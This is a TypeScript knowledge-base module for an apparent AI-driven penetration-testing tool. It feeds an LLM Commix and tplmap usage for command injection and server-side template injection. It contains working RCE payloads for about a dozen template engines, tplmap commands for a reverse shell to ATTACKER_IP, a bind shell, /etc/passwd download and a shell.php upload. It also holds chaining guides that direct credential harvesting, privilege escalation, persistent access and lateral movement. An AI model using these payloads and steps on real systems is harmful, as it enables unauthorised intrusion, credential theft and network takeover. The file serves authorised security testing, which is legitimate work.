/**
 * Advanced Injection Tools Knowledge Base
 *
 * Comprehensive usage guides for Commix (command injection) and tplmap (template injection).
 * Injected into LLM context during exploit planning and vuln detection phases
 * so the AI can craft precise commands, interpret output correctly, and chain
 * findings into exploitation paths.
 */

// ─── Commix Advanced Knowledge ─────────────────────────────────────────────────

export const COMMIX_KNOWLEDGE = {
  name: "Commix",
  version: "3.x",
  purpose: "Automated OS command injection detection and exploitation",
  installVerify: "which commix || test -f /opt/commix/commix.py",
  installCommand: "cd /opt && git clone https://github.com/commixproject/commix.git && pip3 install -r /opt/commix/requirements.txt && ln -sf /opt/commix/commix.py /usr/local/bin/commix",

  // ── When to Use ──
  useCases: [
    "Web forms that pass user input to system commands (ping, traceroute, nslookup, file operations)",
    "API endpoints that execute OS commands based on parameters",
    "CGI scripts and legacy web applications",
    "Applications with known command injection CVEs",
    "Post-authentication admin panels with system utilities",
  ],

  // ── CLI Reference ──
  cliPatterns: {
    basicScan: `commix --url="http://target.com/page?param=value" --batch`,
    postScan: `commix --url="http://target.com/page" --data="param=value" --batch`,
    authenticatedScan: `commix --url="http://target.com/page?param=value" --cookie="PHPSESSID=abc123" --batch`,
    headerInjection: `commix --url="http://target.com/page" --header="X-Forwarded-For: *" --batch`,
    specificParam: `commix --url="http://target.com/page?a=1&b=2" -p b --batch`,
    aggressiveScan: `commix --url="http://target.com/page?param=value" --level=3 --technique=CEFT --batch`,
    windowsTarget: `commix --url="http://target.com/page?param=value" --os=windows --batch`,
    wafBypass: `commix --url="http://target.com/page?param=value" --tamper=base64encode --batch`,
    withProxy: `commix --url="http://target.com/page?param=value" --proxy="http://127.0.0.1:8080" --batch`,
  },

  // ── Injection Techniques ──
  techniques: {
    C: { name: "Classic/Results-based", description: "Direct output of injected command appears in response. Most reliable.", example: "; whoami" },
    E: { name: "Eval-based", description: "Injection via code evaluation functions (eval, exec, system). Common in PHP/Python.", example: "'; echo shell_exec('id'); //" },
    F: { name: "File-based", description: "Write command output to a web-accessible file, then read it. Useful when direct output is filtered.", example: "; id > /var/www/html/output.txt" },
    T: { name: "Time-based blind", description: "Detect injection via response time delays. Works when no output is visible.", example: "; sleep 5" },
  },

  // ── Levels ──
  levels: {
    1: "Basic — tests GET/POST parameters with common separators (; | && ||)",
    2: "Moderate — adds backtick, $(), newline injection, double-encoding",
    3: "Aggressive — tests cookies, headers, User-Agent, Referer; all encoding variants",
  },

  // ── Output Interpretation ──
  outputPatterns: {
    confirmed: [
      /the\s+.*parameter.*is\s+injectable/i,
      /command\s+injection.*identified/i,
      /os\s+command\s+injection/i,
    ],
    osProof: [
      /uid=\d+/,           // Linux id output
      /root:/,             // /etc/passwd content
      /www-data/,          // Web server user
      /MINGW|Windows/i,    // Windows detection
    ],
    wafDetected: [
      /waf.*detected/i,
      /firewall/i,
      /403.*forbidden/i,
      /blocked/i,
    ],
  },

  // ── Common Vulnerable Patterns ──
  vulnerablePatterns: [
    "PHP: system(), exec(), passthru(), shell_exec(), popen(), proc_open()",
    "Python: os.system(), os.popen(), subprocess.call(), subprocess.Popen()",
    "Node.js: child_process.exec(), child_process.spawn() with shell:true",
    "Java: Runtime.exec(), ProcessBuilder",
    "Ruby: system(), exec(), backticks, %x{}",
    "Perl: system(), exec(), backticks, open() with pipe",
  ],

  // ── WAF Bypass Tamper Scripts ──
  tamperScripts: [
    { name: "base64encode", description: "Base64 encode the payload" },
    { name: "hexencode", description: "Hex encode the payload" },
    { name: "doublequotes", description: "Use double quotes for space bypass" },
    { name: "nested", description: "Nested command substitution" },
    { name: "caret", description: "Windows caret (^) character insertion" },
    { name: "dollaratsigns", description: "Use $@ for character splitting" },
  ],

  // ── Chaining with Other Findings ──
  chainingGuide: `
When Commix confirms command injection:
1. VERIFY: Run "id" or "whoami" to confirm execution context
2. ENUMERATE: Check user privileges, network interfaces, installed tools
3. ESCALATE: If running as www-data, check sudo -l, SUID binaries, kernel version
4. PIVOT: Use the injection point to establish a reverse shell for persistent access
5. EVIDENCE: Capture the full request/response showing command execution proof
6. CHAIN: If SQLMap found SQLi on same host, command injection provides OS-level access
   that SQLi alone may not achieve (direct file system, network pivoting)
`,
};

// ─── tplmap Advanced Knowledge ──────────────────────────────────────────────────

export const TPLMAP_KNOWLEDGE = {
  name: "tplmap",
  version: "0.5+",
  purpose: "Automated Server-Side Template Injection (SSTI) detection and exploitation",
  installVerify: "which tplmap || test -f /opt/tplmap/tplmap.py",
  installCommand: "cd /opt && git clone https://github.com/epinna/tplmap.git && pip3 install -r /opt/tplmap/requirements.txt && ln -sf /opt/tplmap/tplmap.py /usr/local/bin/tplmap && chmod +x /opt/tplmap/tplmap.py",

  // ── When to Use ──
  useCases: [
    "Web applications using server-side template engines (Jinja2, Twig, Mako, Smarty, etc.)",
    "User input reflected in rendered pages (profile names, email templates, error messages)",
    "CMS platforms with custom template editing features",
    "Applications where {{7*7}} or similar probes return '49' in the response",
    "API endpoints that render templates from user-supplied data",
  ],

  // ── CLI Reference ──
  cliPatterns: {
    basicScan: `tplmap -u "http://target.com/page?param=value"`,
    postScan: `tplmap -u "http://target.com/page" -d "param=value"`,
    authenticatedScan: `tplmap -u "http://target.com/page?param=value" -c "session=abc123"`,
    specificEngine: `tplmap -u "http://target.com/page?param=value" -e jinja2`,
    osShellAccess: `tplmap -u "http://target.com/page?param=value" --os-shell`,
    osCommand: `tplmap -u "http://target.com/page?param=value" --os-cmd "id"`,
    fileRead: `tplmap -u "http://target.com/page?param=value" --download "/etc/passwd" "./passwd.txt"`,
    fileWrite: `tplmap -u "http://target.com/page?param=value" --upload "./shell.php" "/var/www/html/shell.php"`,
    reverseShell: `tplmap -u "http://target.com/page?param=value" --reverse-shell ATTACKER_IP PORT`,
    bindShell: `tplmap -u "http://target.com/page?param=value" --bind-shell PORT`,
    headerInjection: `tplmap -u "http://target.com/page" -H "X-Custom: *"`,
    advancedLevel: `tplmap -u "http://target.com/page?param=value" --level 2`,
  },

  // ── Supported Template Engines ──
  engines: {
    // Python engines
    jinja2:   { language: "Python", frameworks: ["Flask", "Django (custom)", "FastAPI"], probes: ["{{7*7}}", "{{config}}", "{{self.__class__}}"], rcePayload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
    mako:     { language: "Python", frameworks: ["Pylons", "Pyramid"], probes: ["${7*7}"], rcePayload: "<%import os%>${os.popen('id').read()}" },
    tornado:  { language: "Python", frameworks: ["Tornado"], probes: ["{{7*7}}"], rcePayload: "{%import os%}{{os.popen('id').read()}}" },

    // PHP engines
    twig:     { language: "PHP", frameworks: ["Symfony", "Craft CMS", "Drupal 8+"], probes: ["{{7*7}}"], rcePayload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
    smarty:   { language: "PHP", frameworks: ["Smarty CMS"], probes: ["{7*7}", "{php}echo 'test';{/php}"], rcePayload: "{php}echo shell_exec('id');{/php}" },

    // Java engines
    freemarker: { language: "Java", frameworks: ["Spring", "Struts"], probes: ["${7*7}"], rcePayload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}" },
    velocity:   { language: "Java", frameworks: ["Apache Velocity"], probes: ["#set($x=7*7)$x"], rcePayload: "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))" },
    pebble:     { language: "Java", frameworks: ["PebbleTemplates"], probes: ["{{7*7}}"], rcePayload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}" },

    // Ruby engines
    erb:  { language: "Ruby", frameworks: ["Rails", "Sinatra"], probes: ["<%= 7*7 %>"], rcePayload: "<%= system('id') %>" },
    slim: { language: "Ruby", frameworks: ["Slim"], probes: ["= 7*7"], rcePayload: "= system('id')" },

    // JavaScript engines
    nunjucks: { language: "JavaScript", frameworks: ["Express", "Koa"], probes: ["{{7*7}}"], rcePayload: "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}" },
    ejs:      { language: "JavaScript", frameworks: ["Express"], probes: ["<%= 7*7 %>"], rcePayload: "<%= global.process.mainModule.require('child_process').execSync('id') %>" },
    jade:     { language: "JavaScript", frameworks: ["Express (legacy)"], probes: ["#{7*7}"], rcePayload: "- var x = global.process.mainModule.require('child_process').execSync('id')" },
  },

  // ── Detection Strategy ──
  detectionStrategy: `
SSTI Detection Workflow:
1. IDENTIFY reflection points: Find where user input appears in rendered output
2. POLYGLOT PROBE: Send {{7*7}} — if "49" appears, likely Jinja2/Twig/Nunjucks/Pebble
3. DIFFERENTIATE engines:
   - {{7*7}}=49 + {{config}} works → Jinja2 (Python)
   - {{7*7}}=49 + {{_self}} works → Twig (PHP)
   - \${7*7}=49 → Mako (Python) or FreeMarker (Java)
   - <%= 7*7 %>=49 → ERB (Ruby) or EJS (JavaScript)
   - {7*7}=49 → Smarty (PHP)
   - #set($x=7*7)$x=49 → Velocity (Java)
4. CONFIRM with engine-specific payload
5. ESCALATE to RCE using engine-specific exploit chain
`,

  // ── Output Interpretation ──
  outputPatterns: {
    confirmed: [
      /injectable/i,
      /injection\s+confirmed/i,
      /template\s+injection.*?found/i,
      /identified.*engine/i,
    ],
    engineDetected: [
      /engine:\s*(\w+)/i,
      /identified\s+['"]?(\w+)['"]?\s+engine/i,
      /confirmed.*?['"](\w+)['"]\s+engine/i,
    ],
    capabilities: [
      /shell\s+command\s+execution/i,
      /file\s+read/i,
      /file\s+write/i,
      /bind\s+shell/i,
      /reverse\s+shell/i,
      /code\s+evaluation/i,
    ],
  },

  // ── Chaining with Other Findings ──
  chainingGuide: `
When tplmap confirms SSTI:
1. IDENTIFY ENGINE: Know the exact template engine and language for targeted exploitation
2. READ FILES: Use --download to read /etc/passwd, config files, database credentials
3. RCE: Use --os-cmd or --os-shell for command execution
4. CREDENTIAL HARVEST: Read application config files for DB passwords, API keys
5. CHAIN WITH SQLMap: If DB credentials found via SSTI → use SQLMap with --dbms and creds
6. CHAIN WITH Commix: SSTI often coexists with command injection in same application
7. EVIDENCE: Capture engine identification, RCE proof (id/whoami output), file read output
8. LATERAL MOVEMENT: Use reverse shell for persistent access, then pivot to internal network
`,
};

// ─── Screenshot Capture Knowledge ───────────────────────────────────────────────

export const SCREENSHOT_KNOWLEDGE = {
  name: "Puppeteer/Chromium Screenshot Capture",
  purpose: "Capture visual evidence of web vulnerabilities during exploitation",
  useCases: [
    "XSS proof: screenshot showing alert box or DOM manipulation",
    "Defacement proof: screenshot of modified page content",
    "Information disclosure: screenshot of exposed admin panels, debug pages",
    "Authentication bypass: screenshot of unauthorized access to protected pages",
    "IDOR: screenshot showing access to another user's data",
  ],
  capturePoints: [
    "Before exploitation (baseline)",
    "During exploitation (payload execution)",
    "After exploitation (impact demonstration)",
  ],
};

// ─── Context Builder for LLM ────────────────────────────────────────────────────

export function buildInjectionToolContext(): string {
  const sections: string[] = [];

  sections.push("## Advanced Injection Testing Tools\n");

  // Commix section
  sections.push("### Commix — OS Command Injection");
  sections.push(`**Purpose:** ${COMMIX_KNOWLEDGE.purpose}`);
  sections.push(`**Install:** \`${COMMIX_KNOWLEDGE.installCommand}\``);
  sections.push("\n**When to use:**");
  for (const uc of COMMIX_KNOWLEDGE.useCases) {
    sections.push(`- ${uc}`);
  }
  sections.push("\n**CLI Examples:**");
  for (const [name, cmd] of Object.entries(COMMIX_KNOWLEDGE.cliPatterns)) {
    sections.push(`- ${name}: \`${cmd}\``);
  }
  sections.push("\n**Injection Techniques:**");
  for (const [code, tech] of Object.entries(COMMIX_KNOWLEDGE.techniques)) {
    sections.push(`- **${code}** (${tech.name}): ${tech.description}. Example: \`${tech.example}\``);
  }
  sections.push("\n**Vulnerable Code Patterns:**");
  for (const p of COMMIX_KNOWLEDGE.vulnerablePatterns) {
    sections.push(`- ${p}`);
  }
  sections.push(`\n**Exploitation Chain:**\n${COMMIX_KNOWLEDGE.chainingGuide}`);

  // tplmap section
  sections.push("\n### tplmap — Server-Side Template Injection (SSTI)");
  sections.push(`**Purpose:** ${TPLMAP_KNOWLEDGE.purpose}`);
  sections.push(`**Install:** \`${TPLMAP_KNOWLEDGE.installCommand}\``);
  sections.push("\n**When to use:**");
  for (const uc of TPLMAP_KNOWLEDGE.useCases) {
    sections.push(`- ${uc}`);
  }
  sections.push("\n**CLI Examples:**");
  for (const [name, cmd] of Object.entries(TPLMAP_KNOWLEDGE.cliPatterns)) {
    sections.push(`- ${name}: \`${cmd}\``);
  }
  sections.push("\n**Supported Engines (15+):**");
  for (const [engine, info] of Object.entries(TPLMAP_KNOWLEDGE.engines)) {
    sections.push(`- **${engine}** (${info.language}): ${info.frameworks.join(", ")} — Probe: \`${info.probes[0]}\``);
  }
  sections.push(`\n**Detection Strategy:**\n${TPLMAP_KNOWLEDGE.detectionStrategy}`);
  sections.push(`\n**Exploitation Chain:**\n${TPLMAP_KNOWLEDGE.chainingGuide}`);

  return sections.join("\n");
}

/**
 * Get tool-specific knowledge for a given vulnerability type.
 * Used by the exploit planner to select the right tool.
 */
export function getInjectionToolForVulnType(vulnType: string): { tool: string; knowledge: typeof COMMIX_KNOWLEDGE | typeof TPLMAP_KNOWLEDGE } | null {
  const normalized = vulnType.toLowerCase();

  if (/command\s*inject|os\s*command|rce.*command|cmdi/i.test(normalized)) {
    return { tool: "commix", knowledge: COMMIX_KNOWLEDGE };
  }

  if (/template\s*inject|ssti|server.side\s*template/i.test(normalized)) {
    return { tool: "tplmap", knowledge: TPLMAP_KNOWLEDGE };
  }

  return null;
}
